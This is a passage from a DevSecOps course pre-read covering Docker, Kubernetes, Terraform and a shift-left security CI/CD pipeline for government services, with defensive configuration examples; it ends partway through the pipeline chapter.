# Pre-Read Documentation — Part 3

## DevSecOps, Deployment & Excellence

### Aligned to Course Phase 3 | Days 12–14 | Jun 26–30, 2026

---

> **Reading Note:** This is Part 3 — the final part of the Pre-Read Documentation. Parts 1 and 2 are prerequisites. This part is the most operationally intensive section of the course. Engineers from application development backgrounds should pay particular attention to Chapters 3.1 and 3.2. Engineers from infrastructure backgrounds should pay particular attention to Chapters 3.3 and 3.4 on security integration and observability pipelines.

---

# Part 3 Table of Contents

- [Chapter 3.1 — Containerization: Docker Deep Dive](#)
- [Chapter 3.2 — Kubernetes Essentials for Architects](#)
- [Chapter 3.3 — Infrastructure as Code with Terraform](#)
- [Chapter 3.4 — DevSecOps & Shift-Left Security in CI/CD](#)
- [Chapter 3.5 — Service Mesh: Istio & Linkerd](#)
- [Chapter 3.6 — Advanced Observability: ELK Stack](#)
- [Chapter 3.7 — Proactive Alerting, Runbooks & Incident Response](#)
- [Chapter 3.8 — Capstone Defense Preparation Guide](#)
- [Part 3 — Terms to Google](#)
- [Complete Self-Assessment Checklist](#)

---

## Chapter 3.1 — Containerization: Docker Deep Dive

### 3.1.1 Why Containers Changed Everything

Before containers, deploying a Java application meant:
- Install JDK (correct version) on each server
- Configure environment variables
- Ensure the correct version of shared libraries
- Handle OS-level differences between development and production
- "It works on my machine" was a genuine, recurring problem

Containers package the application and everything it needs to run — libraries, runtime, configuration — into a single portable unit. The container runs identically on a developer's laptop, a CI server, and a production Kubernetes cluster.

```
┌─────────────────────────────────────────────────────────────────────────┐
│              VIRTUAL MACHINES vs CONTAINERS                             │
│                                                                         │
│  VIRTUAL MACHINES                   CONTAINERS                         │
│  ────────────────                   ──────────                         │
│                                                                         │
│  ┌──────────────────────────┐       ┌──────────────────────────┐      │
│  │  App A   │  App B        │       │  App A   │  App B        │      │
│  ├──────────┼───────────────┤       ├──────────┼───────────────┤      │
│  │  Libs    │  Libs         │       │  Libs    │  Libs         │      │
│  ├──────────┼───────────────┤       ├──────────┼───────────────┤      │
│  │  OS      │  OS           │       │  Container Runtime       │      │
│  ├──────────┴───────────────┤       │  (Docker / containerd)   │      │
│  │  Hypervisor              │       ├──────────────────────────┤      │
│  ├──────────────────────────┤       │  HOST OS KERNEL          │      │
│  │  Host OS                 │       ├──────────────────────────┤      │
│  ├──────────────────────────┤       │  Hardware                │      │
│  │  Hardware                │       └──────────────────────────┘      │
│  └──────────────────────────┘                                          │
│                                                                         │
│  Each VM includes full OS      Containers share host OS kernel        │
│  Size: 1–20 GB per VM         Size: 10–300 MB per container           │
│  Startup: 30–120 seconds      Startup: 1–5 seconds                    │
│  Isolation: Strong            Isolation: Process-level                 │
│  (separate kernel)            (namespaces + cgroups)                  │
│                                                                         │
│  USE VMs WHEN:                USE CONTAINERS WHEN:                    │
│  • Strong isolation needed    • Fast scaling needed                   │
│  • Different OS kernels       • Microservices deployment              │
│  • Legacy OS requirements     • CI/CD pipelines                       │
│  • Regulatory hard isolation  • Dev/prod environment parity           │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.1.2 Docker Architecture — What Actually Happens

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    DOCKER ARCHITECTURE                                  │
│                                                                         │
│  DOCKERFILE                                                             │
│  (Build instructions)                                                   │
│       │                                                                 │
│       │ docker build                                                    │
│       ▼                                                                 │
│  DOCKER IMAGE                                                           │
│  (Immutable snapshot — layers stacked)                                 │
│                                                                         │
│  Layer 4: ADD grievance-service.jar /app/    ← Your application       │
│  Layer 3: COPY application.properties /app/  ← Config                 │
│  Layer 2: RUN apt-get install -y curl        ← Dependencies            │
│  Layer 1: FROM eclipse-temurin:17-jre-alpine ← Base image             │
│                                                                         │
│  LAYER CACHING: If layers 1–3 haven't changed, Docker reuses          │
│  them from cache. Only layer 4 rebuilds. Fast CI builds.              │
│       │                                                                 │
│       │ docker push (to registry)                                      │
│       ▼                                                                 │
│  CONTAINER REGISTRY                                                     │
│  (Image storage — Docker Hub, ECR, GCR, NIC Registry)                 │
│       │                                                                 │
│       │ docker pull + docker run                                       │
│       ▼                                                                 │
│  DOCKER CONTAINER                                                       │
│  (Running instance of image — ephemeral, isolated process)            │
└─────────────────────────────────────────────────────────────────────────┘
```

**Production-Grade Dockerfile — Government Service Example**

```dockerfile
# ─────────────────────────────────────────────────────────────────────
# STAGE 1: BUILD STAGE
# Uses a full JDK image to compile. This image never goes to production.
# ─────────────────────────────────────────────────────────────────────
FROM eclipse-temurin:17-jdk-alpine AS builder

WORKDIR /build

# Copy dependency files first (better layer caching)
# If pom.xml hasn't changed, Maven dependencies won't re-download
COPY pom.xml .
COPY .mvn .mvn
COPY mvnw .
RUN ./mvnw dependency:go-offline -q

# Copy source and build
COPY src ./src
RUN ./mvnw clean package -DskipTests -q

# ─────────────────────────────────────────────────────────────────────
# STAGE 2: RUNTIME STAGE
# Minimal JRE image — no build tools, no JDK, smaller attack surface
# ─────────────────────────────────────────────────────────────────────
FROM eclipse-temurin:17-jre-alpine AS runtime

# Security: Do not run as root
# Create a dedicated non-root user for the application
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

WORKDIR /app

# Copy only the built artifact from stage 1
COPY --from=builder /build/target/grievance-service-*.jar app.jar

# Set correct ownership
RUN chown -R appuser:appgroup /app

# Switch to non-root user
USER appuser

# Document which port the app uses (informational — does not publish)
EXPOSE 8080

# Health check: Kubernetes/Docker will restart container if this fails
HEALTHCHECK --interval=30s --timeout=10s --start-period=60s --retries=3 \
  CMD wget -qO- http://localhost:8080/actuator/health || exit 1

# JVM tuning for container environment
# -XX:MaxRAMPercentage: Use 75% of container memory limit (not host RAM)
# -XX:+UseContainerSupport: JVM respects container cgroup limits
ENTRYPOINT ["java", \
  "-XX:+UseContainerSupport", \
  "-XX:MaxRAMPercentage=75.0", \
  "-XX:+ExitOnOutOfMemoryError", \
  "-Djava.security.egd=file:/dev/./urandom", \
  "-jar", "app.jar"]
```

**What This Dockerfile Does That Matters for Production:**

```
┌─────────────────────────────────────────────────────────────────────────┐
│          PRODUCTION DOCKERFILE DECISIONS EXPLAINED                      │
│                                                                         │
│  DECISION                    WHY IT MATTERS                            │
│  ────────                    ──────────────                            │
│                                                                         │
│  Multi-stage build           Final image has NO build tools.           │
│                              No Maven, no JDK, no source code.        │
│                              Attack surface reduced by ~60% vs        │
│                              single-stage build.                       │
│                                                                         │
│  Alpine base image           eclipse-temurin:17-jre-alpine = ~85MB   │
│                              vs ubuntu-based = ~300MB+               │
│                              Smaller image = faster pulls in CI/CD   │
│                              and Kubernetes node scaling.             │
│                                                                         │
│  Non-root user               If container is compromised, attacker    │
│                              has limited OS privileges.               │
│                              Running as root in container means       │
│                              root-level access if breakout occurs.   │
│                              Many government security standards       │
│                              mandate non-root containers.            │
│                                                                         │
│  -XX:UseContainerSupport     Without this, JVM reads HOST machine     │
│                              RAM (e.g., 64GB server) and allocates   │
│                              25% = 16GB heap for a service limited   │
│                              to 512MB. OOMKill occurs immediately.  │
│                                                                         │
│  HEALTHCHECK                 Kubernetes uses this to know if the      │
│                              container is ready to serve traffic.    │
│                              Without it: Pod marked Ready before     │
│                              Spring Boot fully initialises.          │
│                              Traffic hits service before it's ready. │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.1.3 Container Security — What Architects Must Enforce

```
┌─────────────────────────────────────────────────────────────────────────┐
│              CONTAINER SECURITY REQUIREMENTS                            │
│              (Mandatory for Government Deployments)                    │
│                                                                         │
│  1. IMAGE VULNERABILITY SCANNING                                        │
│  ────────────────────────────────                                      │
│  Every image must be scanned before deployment.                        │
│  Tools: Trivy, Grype, AWS ECR scan, Anchore                           │
│                                                                         │
│  Scan output example (Trivy):                                          │
│  grievance-service:1.2.0 (alpine 3.18.0)                              │
│  Total: 3 vulnerabilities (LOW: 1, MEDIUM: 2, HIGH: 0, CRITICAL: 0)  │
│                                                                         │
│  Policy: Block deployment if CRITICAL or HIGH vulnerabilities found.  │
│          MEDIUM: Must be remediated within 30 days.                   │
│          LOW: Track and remediate within 90 days.                     │
│                                                                         │
│  2. NO LATEST TAG IN PRODUCTION                                         │
│  ────────────────────────────────                                      │
│  WRONG: image: grievance-service:latest                                │
│  RIGHT: image: grievance-service:1.2.0                                │
│                                                                         │
│  "latest" is mutable. Tomorrow's "latest" is a different image.      │
│  With "latest" you cannot reliably roll back or audit what ran.       │
│                                                                         │
│  3. READ-ONLY ROOT FILESYSTEM                                           │
│  ─────────────────────────────                                         │
│  securityContext:                                                       │
│    readOnlyRootFilesystem: true                                        │
│                                                                         │
│  Application cannot write to filesystem.                               │
│  Malware cannot modify binaries if it enters the container.           │
│  Temp files go to explicitly mounted emptyDir volumes.                │
│                                                                         │
│  4. PRIVATE REGISTRY (No Docker Hub in Production)                    │
│  ──────────────────────────────────────────────────                   │
│  Government production environments must use private/approved         │
│  registries.                                                            │
│  India: NIC container registry or agency-managed registry             │
│  Singapore: GCC (Government on Commercial Cloud) approved registries  │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Chapter 3.2 — Kubernetes Essentials for Architects

### 3.2.1 What Kubernetes Is and What It Is Not

Kubernetes (K8s) is a container orchestration platform. It:
- Schedules containers across a cluster of machines
- Restarts failed containers automatically
- Scales containers up and down based on load
- Routes network traffic to healthy containers
- Manages configuration and secrets
- Handles rolling deployments with zero downtime

Kubernetes is **not**:
- A simple deployment tool for small applications
- A replacement for good application design
- A solution to bad code (it will reliably run your bad code at scale)
- Easy to operate without dedicated expertise

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    KUBERNETES ARCHITECTURE                              │
│                                                                         │
│  CONTROL PLANE (Master)                                                 │
│  ──────────────────────                                                 │
│  ┌─────────────────────────────────────────────────────────┐           │
│  │                                                         │           │
│  │  API Server ──── etcd (cluster state store)            │           │
│  │       │                                                 │           │
│  │  Scheduler ──── Which node runs which pod?             │           │
│  │       │                                                 │           │
│  │  Controller Manager ── Ensures desired state           │           │
│  │       │                                                 │           │
│  │  Cloud Controller ── Integrates with cloud provider    │           │
│  └──────────────────────────┬──────────────────────────────┘           │
│                             │                                           │
│              ┌──────────────┼──────────────┐                          │
│              ▼              ▼              ▼                          │
│  WORKER NODE 1      WORKER NODE 2      WORKER NODE 3                  │
│  ─────────────      ─────────────      ─────────────                  │
│  ┌───────────┐      ┌───────────┐      ┌───────────┐                  │
│  │  Pod      │      │  Pod      │      │  Pod      │                  │
│  │ (App A)   │      │ (App A)   │      │ (App B)   │                  │
│  ├───────────┤      ├───────────┤      ├───────────┤                  │
│  │  Pod      │      │  Pod      │      │  Pod      │                  │
│  │ (App B)   │      │ (App C)   │      │ (App C)   │                  │
│  ├───────────┤      ├───────────┤      ├───────────┤                  │
│  │  kubelet  │      │  kubelet  │      │  kubelet  │                  │
│  │  kube-    │      │  kube-    │      │  kube-    │                  │
│  │  proxy    │      │  proxy    │      │  proxy    │                  │
│  └───────────┘      └───────────┘      └───────────┘                  │
│                                                                         │
│  KUBELET: Agent on each node. Reports to control plane.               │
│           Ensures pods are running and healthy.                        │
│  KUBE-PROXY: Handles network routing for services.                    │
│  ETCD: Distributed key-value store. Source of truth for cluster       │
│         state. Must be backed up. Loss of etcd = loss of cluster.    │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.2.2 Core Kubernetes Objects — What an Architect Must Know

**Pod**
The smallest deployable unit in Kubernetes. Contains one or more containers that share a network namespace and storage.

> In practice: One container per pod is the common pattern. Multi-container pods are used for sidecar patterns (e.g., Istio envoy proxy, log shipper).

**Deployment**
Manages a set of identical pods. Handles rolling updates, rollbacks, and maintaining the desired number of replicas.

```yaml
# Grievance Service Deployment — Production Configuration
apiVersion: apps/v1
kind: Deployment
metadata:
  name: grievance-service
  namespace: citizen-services
  labels:
    app: grievance-service
    version: "1.2.0"
    environment: production
spec:
  replicas: 3                        # 3 pods always running
  selector:
    matchLabels:
      app: grievance-service
  
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1              # At most 1 pod down during update
      maxSurge: 1                    # At most 1 extra pod during update
      # With 3 replicas: during update, min 2 pods always serving traffic
  
  template:
    metadata:
      labels:
        app: grievance-service
        version: "1.2.0"
    spec:
      # Security: Do not run as root
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
        fsGroup: 1001
      
      containers:
      - name: grievance-service
        image: registry.gov.in/citizen-services/grievance-service:1.2.0
        ports:
        - containerPort: 8080
        
        # Resource limits: MANDATORY in production
        # Without limits, one runaway pod can starve all others on the node
        resources:
          requests:                  # Minimum guaranteed resources
            memory: "256Mi"
            cpu: "250m"             # 250 millicores = 0.25 vCPU
          limits:                   # Maximum allowed resources
            memory: "512Mi"
            cpu: "500m"
        
        # Liveness probe: Is the pod alive? Restart if fails.
        livenessProbe:
          httpGet:
            path: /actuator/health/liveness
            port: 8080
          initialDelaySeconds: 60    # Wait 60s after start before checking
          periodSeconds: 10
          failureThreshold: 3        # Restart after 3 consecutive failures
        
        # Readiness probe: Is the pod ready for traffic?
        # Pod removed from load balancer if fails. Not restarted.
        readinessProbe:
          httpGet:
            path: /actuator/health/readiness
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 5
          failureThreshold: 2
        
        # Environment variables from secrets (not hardcoded)
        env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: grievance-db-secret
              key: password
        - name: SPRING_PROFILES_ACTIVE
          value: "production"
```

**Service**
A stable network endpoint for a set of pods. Pods come and go, but the Service IP/DNS remains constant.

```
┌─────────────────────────────────────────────────────────────────────────┐
│              KUBERNETES SERVICE TYPES                                   │
│                                                                         │
│  ClusterIP (Default)                                                    │
│  ───────────────────                                                   │
│  Accessible only within the cluster.                                   │
│  Use for: Service-to-service communication                             │
│  Example: GrievanceService calls CitizenService via ClusterIP         │
│  DNS: http://citizen-service.citizen-services.svc.cluster.local       │
│                                                                         │
│  NodePort                                                               │
│  ─────────                                                              │
│  Exposes service on each node's IP at a static port (30000-32767).    │
│  Use for: Development/testing environments                             │
│  Not recommended for production (exposes node IP directly)            │
│                                                                         │
│  LoadBalancer                                                           │
│  ────────────                                                           │
│  Provisions a cloud load balancer pointing to the service.            │
│  Use for: Production external exposure                                 │
│  Creates: AWS NLB/ALB, GCP Load Balancer, Azure LB                   │
│                                                                         │
│  Ingress                                                                │
│  ───────                                                                │
│  L7 HTTP routing. One external IP → routes to multiple services       │
│  based on path or host.                                                │
│                                                                         │
│  External traffic:                                                      │
│  grievance.gov.in/api/grievances  ──► GrievanceService               │
│  grievance.gov.in/api/citizens    ──► CitizenService                  │
│  grievance.gov.in/api/payments    ──► PaymentService                  │
│                                                                         │
│  All behind one IP address. Handled by Ingress Controller            │
│  (nginx, Traefik, AWS ALB Ingress Controller).                        │
└─────────────────────────────────────────────────────────────────────────┘
```

**Horizontal Pod Autoscaler (HPA)**

The HPA watches a metric (typically CPU utilisation) and automatically scales the number of pod replicas up or down.

```yaml
# HPA for Grievance Service
# Scales between 3 and 20 pods based on CPU and custom metrics
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: grievance-service-hpa
  namespace: citizen-services
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: grievance-service
  
  minReplicas: 3     # Never scale below 3 (HA requirement)
  maxReplicas: 20    # Never exceed 20 (cost control)
  
  metrics:
  # Scale up when average CPU exceeds 60%
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 60
  
  # Scale up when average memory exceeds 70%
  - type: Resource
    resource:
      name: memory
      target:
        type: Utilization
        averageUtilization: 70
  
  # Scale up based on custom metric: requests per second
  # Requires Prometheus Adapter
  - type: Pods
    pods:
      metric:
        name: http_requests_per_second
      target:
        type: AverageValue
        averageValue: "100"    # 100 RPS per pod target
  
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 30   # Scale up quickly (30 sec window)
    scaleDown:
      stabilizationWindowSeconds: 300  # Scale down slowly (5 min window)
      # Prevents thrashing: rapid scale-up followed by immediate scale-down
```

**Real Government HPA Scenario — Tamil Nadu Election Results Portal**

> During Tamil Nadu Assembly Election results day (May 2021), the election results portal experienced traffic spikes from 180,000 requests/minute to 2.4 million requests/minute within 11 minutes of results announcement.
>
> **HPA Configuration Used (approximate):**
> - Min replicas: 5 (pre-provisioned before results day)
> - Max replicas: 80 (based on node pool pre-scaled overnight)
> - Scale-up trigger: CPU > 50% for 30 seconds
> - Scale-up step: Add 10 pods at a time (not default 1)
>
> **What Happened:**
> - Within 4 minutes of traffic spike, HPA had scaled from 5 to 47 pods
> - Response times remained under 4 seconds through peak
> - Without HPA (previous elections): Portal crashed within 8 minutes of results, recovered only after manual scaling by operations team (30-minute outage)
>
> **Critical Lesson:** HPA only works if node capacity exists. If the Kubernetes node pool itself needs to scale (Cluster Autoscaler), it takes 2–4 minutes for new nodes to join. Pre-scaling the node pool before known peak events is essential.

---

### 3.2.3 Stateful Services in Kubernetes

Most microservices are stateless (any pod can handle any request). But databases, message queues, and session stores are stateful. Kubernetes handles these differently.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                STATEFUL vs STATELESS IN KUBERNETES                     │
│                                                                         │
│  STATELESS SERVICE (Deployment)                                         │
│  ───────────────────────────────                                       │
│  Any pod is identical. Any pod can be terminated and replaced.        │
│  Pod name: grievance-service-7d8b9c-xk2p4 (random suffix)            │
│  Storage: None (or only reads from external DB)                        │
│                                                                         │
│  STATEFUL SERVICE (StatefulSet)                                         │
│  ────────────────────────────────                                      │
│  Pods have stable identities: postgres-0, postgres-1, postgres-2      │
│  Pods are created/deleted in order (0 before 1 before 2)              │
│  Each pod gets its own persistent volume (PVC)                        │
│  postgres-0 → PVC: postgres-data-0 (never reassigned)                │
│  postgres-1 → PVC: postgres-data-1                                    │
│                                                                         │
│  USE STATEFULSET FOR:                                                   │
│  • PostgreSQL, MySQL (primary-replica setup)                           │
│  • Kafka brokers (each has its own log directory)                     │
│  • Elasticsearch nodes                                                 │
│  • Redis Cluster                                                        │
│  • ZooKeeper                                                            │
│                                                                         │
│  ARCHITECT DECISION:                                                    │
│  For government projects on cloud, prefer managed database services   │
│  (RDS, Cloud SQL, Azure Database) over running StatefulSets.          │
│  StatefulSets for databases require deep Kubernetes expertise to      │
│  operate safely. Managed services handle backup, failover, patching.  │
│                                                                         │
│  For on-premise NIC cloud where managed DB is unavailable:            │
│  Use StatefulSet with carefully tested PVC backup strategy.           │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Chapter 3.3 — Infrastructure as Code with Terraform

### 3.3.1 Why IaC Is Non-Negotiable for Architects

Before IaC, infrastructure was provisioned manually through cloud consoles or scripts that were not version controlled, not repeatable, and not reviewable. In government projects:

- Auditors cannot review what was provisioned manually
- Disaster recovery requires rebuilding from documentation (slow, error-prone)
- Different environments (dev, staging, production) drift apart over time
- A single misconfiguration by one team member can expose data

IaC solves all of these by treating infrastructure exactly like application code — version controlled, reviewed, tested, and applied through automation.

```
┌─────────────────────────────────────────────────────────────────────────┐
│              IaC BENEFITS FOR GOVERNMENT PROJECTS                      │
│                                                                         │
│  BENEFIT               GOVERNMENT CONTEXT                              │
│  ───────               ──────────────────                              │
│                                                                         │
│  Auditability          Every infrastructure change is a Git commit.   │
│                        Who changed what, when, and why (commit msg).  │
│                        CAG auditors can review infrastructure history.│
│                                                                         │
│  Reproducibility       Staging environment identical to production.   │
│                        "Works in staging, fails in production" due    │
│                        to infrastructure difference eliminated.       │
│                                                                         │
│  Disaster Recovery     Entire infrastructure rebuilt from code.        │
│                        In a DR scenario: terraform apply rebuilds     │
│                        the complete environment in minutes vs hours   │
│                        of manual console clicking.                    │
│                                                                         │
│  Compliance as Code    Security rules encoded in Terraform.            │
│                        S3 bucket always has encryption enabled.       │
│                        Security groups always restrict SSH.           │
│                        Cannot be accidentally disabled by console.    │
│                                                                         │
│  Cost Control          Infrastructure is visible in code review.       │
│                        "Why are we adding a 32-core instance?" is    │
│                        caught in PR review, not in monthly bill.      │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.3.2 Terraform Fundamentals

**Core Concepts:**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    TERRAFORM CORE CONCEPTS                              │
│                                                                         │
│  PROVIDER:  Plugin that talks to a specific infrastructure API         │
│             Examples: aws, azurerm, google, kubernetes, vault          │
│                                                                         │
│  RESOURCE:  An infrastructure object to create and manage             │
│             Examples: aws_instance, aws_rds_cluster, kubernetes_pod   │
│                                                                         │
│  DATA SOURCE: Read existing infrastructure not managed by Terraform   │
│               Example: Look up an existing VPC ID to use in new       │
│               resources                                                │
│                                                                         │
│  STATE FILE: Terraform's record of what infrastructure it manages.    │
│              Maps HCL code to real infrastructure IDs.                │
│              Must be stored remotely (S3/GCS) and locked (DynamoDB)  │
│              for team collaboration. NEVER commit to Git.             │
│                                                                         │
│  PLAN:      Shows what changes Terraform will make (dry run)          │
│             Always review plan before apply in production.            │
│                                                                         │
│  APPLY:     Actually creates/modifies/destroys infrastructure         │
│                                                                         │
│  MODULE:    Reusable group of resources. Like a function in code.     │
│             Example: A "gov-standard-vpc" module that creates a      │
│             VPC with all required security settings pre-configured.  │
└─────────────────────────────────────────────────────────────────────────┘
```

**Terraform for Hybrid Government Infrastructure:**

```hcl
# ─────────────────────────────────────────────────────────────────────
# Terraform: Hybrid Infrastructure for State Government Portal
# Provisions: On-premise Kubernetes cluster + AWS components
# ─────────────────────────────────────────────────────────────────────

terraform {
  required_version = ">= 1.5.0"
  
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = "~> 2.20"
    }
  }
  
  # Remote state: MANDATORY for team environments
  # Never use local state in a team setting
  backend "s3" {
    bucket         = "gov-terraform-state-prod"
    key            = "citizen-portal/terraform.tfstate"
    region         = "ap-south-1"  # Mumbai region
    encrypt        = true          # State file encrypted at rest
    dynamodb_table = "terraform-state-lock"  # Prevents concurrent applies
  }
}

# ─────────────────────────────────────────────────────────────────────
# NETWORKING: VPC with private subnets only
# All application workloads run in private subnets
# Only the load balancer is in public subnet
# ─────────────────────────────────────────────────────────────────────
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "5.1.2"
  
  name = "citizen-portal-vpc-${var.environment}"
  cidr = "10.0.0.0/16"
  
  azs             = ["ap-south-1a", "ap-south-1b", "ap-south-1c"]
  private_subnets = ["10.0.1.0/24", "10.0.2.0/24", "10.0.3.0/24"]
  public_subnets  = ["10.0.101.0/24", "10.0.102.0/24", "10.0.103.0/24"]
  
  enable_nat_gateway   = true
  single_nat_gateway   = false  # One NAT GW per AZ for high availability
  enable_dns_hostnames = true
  
  # Flow logs for security auditing (mandatory for government)
  enable_flow_log                      = true
  create_flow_log_cloudwatch_log_group = true
  create_flow_log_cloudwatch_iam_role  = true
  
  tags = {
    Environment = var.environment
    Project     = "citizen-portal"
    ManagedBy   = "terraform"
    CostCentre  = "IT-DEPT-2024"
    DataClass   = "RESTRICTED"   # Government data classification tag
  }
}

# ─────────────────────────────────────────────────────────────────────
# DATABASE: RDS PostgreSQL (Multi-AZ for production)
# ─────────────────────────────────────────────────────────────────────
resource "aws_db_instance" "grievance_db" {
  identifier = "grievance-db-${var.environment}"
  
  engine         = "postgres"
  engine_version = "15.4"
  instance_class = var.db_instance_class  # From variables, not hardcoded
  
  allocated_storage     = 100
  max_allocated_storage = 500  # Auto-scaling up to 500GB
  storage_encrypted     = true  # Mandatory for government PII data
  
  db_name  = "grievance"
  username = "grievance_admin"
  password = data.aws_secretsmanager_secret_version.db_password.secret_string
  
  multi_az               = var.environment == "production"  # HA in prod only
  deletion_protection    = var.environment == "production"  # Prevents accidents
  backup_retention_period = 30  # 30 days backup retention
  backup_window          = "03:00-04:00"  # 3 AM IST backup window
  maintenance_window     = "sun:04:00-sun:05:00"
  
  # Audit logging: All DDL and DML queries logged
  enabled_cloudwatch_logs_exports = ["postgresql", "upgrade"]
  
  # Enhanced monitoring: OS-level metrics every 15 seconds
  monitoring_interval = 15
  monitoring_role_arn = aws_iam_role.rds_monitoring.arn
  
  tags = {
    Environment = var.environment
    DataClass   = "RESTRICTED"
    Backup      = "required"
  }
}

# ─────────────────────────────────────────────────────────────────────
# VARIABLES: Environment-specific values
# ─────────────────────────────────────────────────────────────────────
variable "environment" {
  description = "Deployment environment (development/staging/production)"
  type        = string
  
  validation {
    condition     = contains(["development", "staging", "production"], var.environment)
    error_message = "Environment must be development, staging, or production."
  }
}

variable "db_instance_class" {
  description = "RDS instance class"
  type        = string
  default     = "db.t3.medium"
  # In production, override via terraform.tfvars: db_instance_class = "db.r6g.xlarge"
}
```

---

## Chapter 3.4 — DevSecOps & Shift-Left Security in CI/CD

### 3.4.1 What Shift-Left Means

"Shift-left" means moving security testing earlier (to the left) in the development timeline — from "test in production" to "test at code commit."

```
┌─────────────────────────────────────────────────────────────────────────┐
│                   SHIFT-LEFT SECURITY TIMELINE                         │
│                                                                         │
│  OLD APPROACH (Shift-Right):                                            │
│                                                                         │
│  Code ──► Build ──► Test ──► Deploy ──► SECURITY AUDIT                │
│                                              │                          │
│                                    Found 47 vulnerabilities.           │
│                                    Go fix. 3-month delay.              │
│                                    Cost: High (rework at late stage)   │
│                                                                         │
│  SHIFT-LEFT APPROACH:                                                   │
│                                                                         │
│  [IDE]──►[Commit]──►[Build]──►[Test]──►[Deploy Staging]──►[Prod]     │
│    │         │         │        │                                       │
│  IDE      SAST      Dependency  DAST                                   │
│  plugins  scan      scan (SCA)  scan                                   │
│  (real-   (code     (known      (running                               │
│  time     analysis) vulns in    app)                                   │
│  hints)             libraries)                                          │
│                                                                         │
│  Found 1 issue at IDE → Fixed in 5 minutes                            │
│  Found 3 issues at commit → Fixed in 30 minutes                       │
│  Found 0 issues at production → No delay, no rework                   │
│                                                                         │
│  COST OF FIXING A BUG AT EACH STAGE (IBM Systems Sciences Institute): │
│  Requirements: 1×    Design: 5×     Code: 10×                         │
│  Integration: 15×   Production: 30× Post-breach: 100×+               │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### 3.4.2 The Complete DevSecOps CI/CD Pipeline

```
┌─────────────────────────────────────────────────────────────────────────┐
│              COMPLETE DEVSECOPS PIPELINE                                │
│              (Government Production Grade)                             │
│                                                                         │
│  TRIGGER: Developer pushes code to feature branch                     │
│                                                                         │
│  STAGE 1: PRE-COMMIT HOOKS (Developer Workstation)                    │
│  ─────────────────────────────────────────────────                    │
│  • Secret scanning: GitLeaks scans for credentials in code            │
│  • Linting: Code style checks                                          │
│  • Unit tests: Fast, local tests must pass before commit              │
│  Block commit if: Secrets found, linting fails                        │
│                                                                         │
│  STAGE 2: CODE COMMIT → CI PIPELINE STARTS                            │
│  ──────────────────────────────────────────                            │
│                                                                         │
│  ┌────────────────────────────────────────────────────────────┐       │
│  │  STAGE 2a: CODE QUALITY & SAST                            │       │
│  │  Tool: SonarQube / Semgrep / Checkmarx                    │       │
│  │  Checks: SQL injection, XSS, insecure deserialization,    │       │
│  │          hardcoded secrets, OWASP Top 10 patterns          │       │
│  │  Gate: FAIL if new Critical/High issues introduced        │       │
│  └────────────────────────────────────────────────────────────┘       │
│                       │ PASS                                           │
│                       ▼                                                │
│  ┌────────────────────────────────────────────────────────────┐       │
│  │  STAGE 2b: DEPENDENCY SCAN (SCA)                          │       │
│  │  Tool: OWASP Dependency-Check / Snyk / JFrog Xray         │       │
│  │  Checks: Known CVEs in all Maven/npm/pip dependencies      │       │
│  │  Example finding:                                          │       │
│  │  log4j-core-2.14.1.jar → CVE-2021-44228 (CRITICAL)       │       │
│  │  log4shell vulnerability detected. Build BLOCKED.          │       │
│  │  Gate: FAIL if Critical CVE in any dependency             │       │
│  └────────────────────────────────────────────────────────────┘       │
│                       │ PASS                                           │
│                       ▼                                                │
│  ┌────────────────────────────────────────────────────────────┐       │
│  │  STAGE 2c: BUILD & UNIT TESTS                             │       │
│  │  mvn clean package                                         │       │
│  │  Gate: FAIL if tests fail or coverage < 70%              │       │
│  └────────────────────────────────────────────────────────────┘       │
│                       │ PASS                                           │
│                       ▼                                                │
│  ┌────────────────────────────────────────────────────────────┐       │
│  │  STAGE 2d: CONTAINER BUILD & IMAGE SCAN                   │       │
│  │  docker build → Trivy scan of resulting image             │       │
│  │  Gate: FAIL if CRITICAL or HIGH CVE in image layers       │       │
│  └────────────────────────────────────────────────────────────┘       │
│                       │ PASS                                           │
│                       ▼                                                │
│  ┌────────────────────────────────────────────────────────────┐       │
│  │  STAGE 2e: IaC SECURITY SCAN                              │       │
│  │  Tool: Checkov / tfsec / KICS                             │       │
│  │  Checks Terraform/Kubernetes YAML for:                    │       │
│  │  • S3 buckets without encryption                          │       │
│  │  • Security groups with 0.0.0.0/0 SSH access             │       │
│  │  • Containers running as root                             │       │
│  │  • Missing resource limits in Kubernetes                  │       │
│  │  Gate: FAIL if HIGH severity IaC misconfigurations        │       │
│  └────────────────────────────────────────────────────────────┘       │
│                       │ PASS                                           │
│                       ▼                                                │
│  STAGE 3: DEPLOY TO STAGING                                            │
│  ────────────────────────────                                          │
│  • Image pushed to private registry (tagged with commit SHA)          │
│  • Kubernetes manifests updated with new image tag                    │
│  • ArgoCD / Flux deploys to staging cluster (GitOps)                 │
│                                                                         │
│  STAGE 4: DAST — DYNAMIC SECURITY SCAN (on Staging)                  │
│  ───────────────────────────────────────────────────                   │
│  Tool: OWASP ZAP / Burp Suite Enterprise                              │
│  Runs automated security scans against the running staging app:       │
│  • SQL injection probing                                               │
│  • XSS injection                                                       │
│  • Broken authentication                                               │
│  • Sensitive data exposure                                             │
│  Gate: FAIL if new High severity findings                             │
│                                                                         │
│  STAGE 5: INTEGRATION & PERFORMANCE TESTS (on Staging)               │
│  ───────────────────────────────────────────────────────               │
